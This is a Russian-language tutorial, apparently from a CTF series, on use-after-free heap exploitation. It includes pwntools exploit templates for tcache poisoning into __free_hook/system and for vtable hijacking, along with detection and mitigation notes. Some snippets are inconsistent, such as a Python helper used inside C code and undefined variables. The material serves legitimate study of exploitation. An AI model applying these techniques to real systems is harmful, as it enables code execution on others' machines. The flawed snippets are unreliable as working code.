Use-After-Free (UAF) — обращение к памяти после её освобождения. Указатель остаётся валидным с точки зрения программы, но память уже возвращена аллокатору и может быть переиспользована под другой объект. UAF — источник самых мощных heap-примитивов: если освобождённый объект содержит указатель на функцию, его можно подменить; если это чанк, можно переписать метаданные и получить произвольную запись. UAF лежит в основе множества реальных уязвимостей — от браузеров до ядер.

## Как возникает UAF

```c
struct obj { void (*cb)(void); char data[0x30]; };
struct obj *o = malloc(sizeof(struct obj));
o->cb = handler;
free(o);
// ... позже ...
o->cb();              // UAF: вызов по указателю из освобождённой памяти
```

Освободив `o`, программа сохранила указатель и позже использует его. Аллокатор уже поместил чанк в tcache, и первые байты данных (`data`) перезаписаны служебными `fd`/`key`. Если мы контролируем, что попадёт в освобождённый чанк, мы контролируем `cb`.

## Типичные сценарии в программах

| Сценарий | Описание |
|---|---|
| «dangling pointer» | указатель не занулили после free |
| «double-free» | free дважды |
| «realloc» | старый указатель используется после realloc |
| «object lifetime» | C++ объект используется после delete |
| «error path» | ветка ошибки освобождает, но продолжает работу |

## UAF на чанке: перезапись метаданных

Если у нас есть UAF на освобождённый чанк и возможность записать туда данные (обычно через тот же примитив редактирования), мы можем переписать `fd` и устроить tcache poisoning. Либо, если чанк в unsorted bin, переписать `bk` и получить запись по адресу (unsorted bin attack).

```python
from pwn import *
p = process('./chall')
# alloc A, free A, edit A (UAF) -> перезапись fd
p.sendlineafter(b'> ', b'3')       # edit
p.sendlineafter(b'idx: ', b'0')
p.sendline(p64(target))            # пишем target в fd
```

## UAF на объекте: подмена указателя на функцию

Если освобождённый объект содержит указатель на функцию, а аллокатор переиспользует чанк под контролируемые данные, следующий вызов `o->cb()` прыгнет туда, куда мы запишем. Классика C++: освобождённый объект с vtable, которую мы перезаписываем на фейковую с адресом `system`/гаджета.

```c
struct obj *a = malloc(0x40);
a->cb = good;
free(a);
char *b = malloc(0x40);   // вернёт тот же чанк
strcpy(b, p64(win));      // перезаписываем cb
// позже a->cb() -> win
```

## UAF + tcache: полный примитив

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # 1) alloc/free с UAF для утечки
    alloc(p, 0x500)          # чанк > tcache -> unsorted bin
    free(p, 0)
    edit(p, 0, b'A'*8)       # UAF-чтение bk -> libc
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ecbe0
    # 2) tcache poisoning через UAF
    alloc(p, 0x40); alloc(p, 0x40)
    free(p, 1); free(p, 2)
    edit(p, 1, p64(libc.symbols['__free_hook'] ^ (chunk1 >> 12)))
    alloc(p, 0x40); alloc(p, 0x40, p64(libc.symbols['system']))
    # 3) free('/bin/sh')
    alloc(p, 0x40, b'/bin/sh\x00'); free(p, 3)
    p.interactive()

exploit()
```

## UAF в ядре и браузере

UAF — доминирующий класс уязвимостей в ядрах (объекты `msg_msg`, `pipe_buffer`, `nftables`) и браузерах (объекты JS/JIT). В ядре UAF даёт overlap двух объектов разного типа, что позволяет читать/писать через один объект, манипулируя другим. В браузере UAF на объекте JIT позволяет подменить указатель на код и получить RCE. Об этом — в `pwn-kernel-heap` и `pwn-browser`.

## Тонкости и подводные камни

- **Проверка «освобождён ли».** Некоторые аллокаторы зануляют указатель — тогда UAF не сработает.
- **Размер чанка.** Чтобы переиспользовать чанк под другой объект, размеры должны совпадать (округлённо).
- **tcache key.** Double-free ловится через `key` в 2.29+; для UAF это не мешает.
- **Safe-linking.** Запись `fd` требует heap base.
- **Срок жизни.** UAF может «работать» только пока чанк не переиспользован — тайминг важен.
- **ASan.** Санитайзер ловит UAF; на цели его обычно нет, но при отладке может мешать.

## Справочные таблицы

| Примитив | Что даёт |
|---|---|
| UAF read | утечка libc/heap |
| UAF write | перезапись fd/metadata |
| UAF call | контроль RIP |
| double-free | tcache/fastbin dup |

| Инструмент | Назначение |
|---|---|
| pwndbg `heap` | увидеть переиспользование |
| `ASAN_OPTIONS=detect_use_after_free=1` | отладка |
| Valgrind | обнаружение UAF |

## Что дальше / решение

Дальше: `pwn-heap-tcache` (использование UAF для poisoning), `pwn-fastbin-dup`, `pwn-kernel-heap` (UAF в ядре). Практический алгоритм: (1) найдите освобождение без зануления указателя; (2) определите размер чанка и куда он попадает; (3) организуйте переиспользование под контролируемые данные; (4) получите примитив (утечка/запись/вызов); (5) нацельтесь на hook/FSOP. UAF — это не баг сам по себе, а дверь: важно, что вы за неё внесёте.

## Разбор реального UAF на C++ объекте

Рассмотрим типичную задачу на C++ с объектом, содержащим vtable. Класс `Animal` имеет виртуальный метод `speak()`. Программа создаёт объект, сохраняет указатель, удаляет объект (`delete`), но указатель не зануляет; позже вызывается `speak()`.

```cpp
class Animal { public: virtual void speak(); };
Animal *a = new Animal();
delete a;                 // объект освобождён
a->speak();               // UAF: vtable читается из освобождённой памяти
```

Объект с vtable занимает чанк, первые 8 байт которого — указатель на vtable. Освободив объект, мы можем через другой аллоцируемый объект того же размера записать туда свой указатель на фейковую vtable, где лежит адрес `system` или гаджета. Следующий вызов `speak()` прыгнет по нашему указателю.

```python
# 1) создать Animal, получить UAF
# 2) аллоцировать буфер того же размера с фейковой vtable
fake_vtable = bss_addr
payload = p64(fake_vtable)     # первый qword объекта = vtable
edit(new_obj, payload)
# 3) в fake_vtable положить адрес system/гаджета
edit(vtable_obj, p64(win))
# 4) вызвать speak() -> прыжок на win
```

## UAF и переиспользование чанков разных типов

Мощь UAF в том, что освобождённый чанк переиспользуется под объект ДРУГОГО типа. В ядре это классический приём: освободить `msg_msg` и переиспользовать под `pipe_buffer`, получив overlap. В userland: освободить структуру с указателем на функцию, переиспользовать под строку, которую контролирует пользователь. Ключ — совпадение размеров чанков (округлённых до 0x10).

## Обнаружение UAF при отладке

```bash
# ASan соберёт программу и покажет место UAF
gcc -fsanitize=address -g chall.c -o chall_asan
./chall_asan
# Valgrind также ловит UAF
valgrind --tool=memcheck ./chall
```

При отладке в pwndbg полезно смотреть `heap` до и после освобождения: чанк, помеченный `Free chunk (tcache)`, при следующем `malloc` того же размера вернётся снова. Если программа использует старый указатель, он указывает на тот же адрес.

## Влияние митигаций на UAF

| Митигация | Влияние |
|---|---|
| safe-linking | усложняет запись fd |
| tcache key | ловит double-free, не UAF |
| MTE (ARM64) | ловит UAF аппаратно |
| ASan | ловит при отладке |
| hardened allocators (scudo) | меняют раскладку |

## Практические советы

Всегда проверяйте, не занулён ли указатель после `free`. Если да — ищите UAF в другом месте (например, в контейнере указателей). Определите размер чанка: он диктует, куда попадёт освобождённая память (tcache/fastbin/unsorted). Организуйте контролируемую аллокацию того же размера, чтобы переиспользовать чанк под свои данные. Затем получите примитив: чтение (утечка), запись (poisoning) или вызов (подмена указателя). UAF сам по себе не даёт победы — важно, какой объект вы наложите на освобождённую память.

## UAF в связке с format string и переполнением

UAF редко используется в одиночку. Часто он комбинируется: переполнение испортило размер соседнего чанка (overlap), затем UAF даёт доступ к перекрытому объекту; format string утекает адреса, а UAF перезаписывает метаданные. Такая комбинация позволяет решать задачи, где каждая уязвимость по отдельности «недостаточна». При анализе всегда ищите, что именно освобождается и что может занять это место.

## Расширенный чек-лист по UAF

1. Найдите `free`/`delete` без зануления указателя.
2. Определите размер чанка (округлённый) и его бин (tcache/fastbin/unsorted).
3. Определите, какой тип объекта может занять чанк (совпадение размера).
4. Организуйте аллокацию контролируемого объекта на месте освобождённого.
5. Получите примитив: утечка (чтение), запись (metadata), вызов (указатель).
6. Нацельтесь на hook/FSOP/GOT в зависимости от версии glibc.

## Итог

UAF — фундаментальный класс багов, порождающий большинство heap-примитивов. Умение распознать dangling pointer, определить размер чанка и организовать переиспользование памяти — ключевой навык. Начните с простых задач «UAF на объекте с указателем функции», затем переходите к UAF на чанке с poisoning и к ядерным UAF.

## Завершение

Практикуйте UAF на задачах разного уровня: сначала подмена указателя функции, затем poisoning через освобождённый чанк, затем ядерные сценарии. Каждый уровень открывает новые примитивы, но базовое понимание «free без зануления» остаётся неизменным.
